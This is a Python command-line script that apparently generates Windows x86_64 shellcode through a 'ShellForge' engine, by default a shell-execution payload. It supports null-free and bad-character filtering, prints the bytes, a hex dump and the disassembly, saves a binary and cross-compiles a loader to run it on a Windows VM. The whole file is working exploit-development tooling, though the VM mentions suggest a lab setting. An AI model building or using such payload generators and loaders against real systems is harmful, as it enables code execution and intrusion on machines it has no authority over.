#!/usr/bin/env python3
"""
gen_windows_payload.py
──────────────────────
Generates a ShellForge Windows payload and optionally
cross-compiles the loader for transfer to the Win10 VM.

Usage:
    python tools/gen_windows_payload.py
    python tools/gen_windows_payload.py --null-free
    python tools/gen_windows_payload.py --bad-chars 00,0a,0d
"""

import sys, os, subprocess, argparse
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from python.engine.shellforge_bridge import (
    ShellForge, Constraints, Arch, OS, Goal, Encoding
)

def main():
    parser = argparse.ArgumentParser(description="ShellForge Windows payload generator")
    parser.add_argument("--null-free",   action="store_true")
    parser.add_argument("--bad-chars",   default="", help="hex bytes e.g. 00,0a,0d")
    parser.add_argument("--goal",        default="exec_shell")
    parser.add_argument("--compile",     action="store_true", help="cross-compile loader")
    parser.add_argument("--out",         default="payload.bin")
    args = parser.parse_args()

    sf = ShellForge()
    print(f"[+] {sf.version()}")

    c = Constraints(os=OS.WINDOWS, arch=Arch.X86_64)
    c.null_free = args.null_free
    if args.bad_chars:
        for b in args.bad_chars.split(","):
            c.add_bad_char(int(b.strip(), 16))

    print(f"[*] Synthesising Windows {args.goal}...")
    r = sf.synthesize(c)

    if not r.ok:
        print(f"[!] Failed: {r.status.name}: {r.error_msg}")
        sys.exit(1)

    print(f"[+] OK — {r.payload_len} bytes, encoding={r.encoding_used.name}")
    print(f"\n── Escaped bytes ────────────────────────────────────")
    print(r.hex_escaped())
    print(f"\n── Hex dump ─────────────────────────────────────────")
    print(r.hex_dump())
    print(f"\n── Disassembly ──────────────────────────────────────")
    print(r.disasm)

    # Save binary
    with open(args.out, "wb") as f:
        f.write(r.payload)
    print(f"\n[+] Binary saved to: {args.out}")

    # Cross-compile loader
    loader_src = os.path.join(os.path.dirname(__file__), "shellforge_loader.c")
    loader_out = os.path.join(os.path.dirname(__file__), "shellforge_loader.exe")

    if args.compile:
        print(f"\n[*] Cross-compiling loader...")
        try:
            result = subprocess.run([
                "x86_64-w64-mingw32-gcc",
                loader_src, "-o", loader_out,
                "-lkernel32"
            ], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Loader compiled: {loader_out}")
            else:
                print(f"[!] Compile failed:\n{result.stderr}")
                print("    Install with: sudo apt install mingw-w64")
        except FileNotFoundError:
            print("[!] mingw-w64 not found. Install: sudo apt install mingw-w64")
    else:
        print(f"\n[*] To cross-compile the loader:")
        print(f"    sudo apt install mingw-w64")
        print(f"    x86_64-w64-mingw32-gcc tools/shellforge_loader.c -o tools/shellforge_loader.exe")

    print(f"\n[*] On your Windows VM:")
    print(f"    shellforge_loader.exe --file {args.out}")
    print(f"    -- OR --")
    hex_str = r.hex_escaped().replace("\\x", " ").strip()
    print(f"    shellforge_loader.exe {r.hex_escaped()[:60]}...")

if __name__ == "__main__":
    main()
